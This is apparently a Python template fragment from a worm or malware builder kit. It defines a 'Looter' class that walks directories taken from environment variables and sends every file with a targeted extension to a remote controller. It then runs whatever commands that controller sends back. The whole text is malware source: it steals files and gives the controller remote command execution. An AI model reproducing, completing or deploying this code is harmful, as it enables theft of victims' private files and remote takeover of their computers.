
class Looter(AdvWorm):
    def __init__(self):
        super().__init__()
        self.name = "Looter"
        self._dirs = {{LOOTER_DIR}}
        self.ftypes = {{LOOTER_EXT}}
        self.downloaded = []
        self.dirs = {}

    def check_dirs(self):
        for d in self._dirs:
            try:
                path = os.environ[d]
                if not path:
                    continue
                self.dirs[d] = path
            except:
                continue
        print(self.dirs)
    
    def _looting(self):
        self.send_msg("Start Looting")
        for dd in self.dirs.values():
            for r, dirs, files in os.walk(dd, topdown=False):
                for f in files:
                    ext = os.path.splitext(f)[-1]
                    if ext in self.ftypes:
                        path = os.path.join(r, f)
                        if path in self.downloaded:
                            continue
                        self.send_file(f, path)
                        self.downloaded.append(path)


    def RUN(self):
        self.check_conn()
        self.check_dirs()
        self._looting()
        while True:
            cmd = self.recive_msg()
            print("CMD:", cmd)
            if not cmd:
                break
            self.exec_cmd(cmd)
        return True

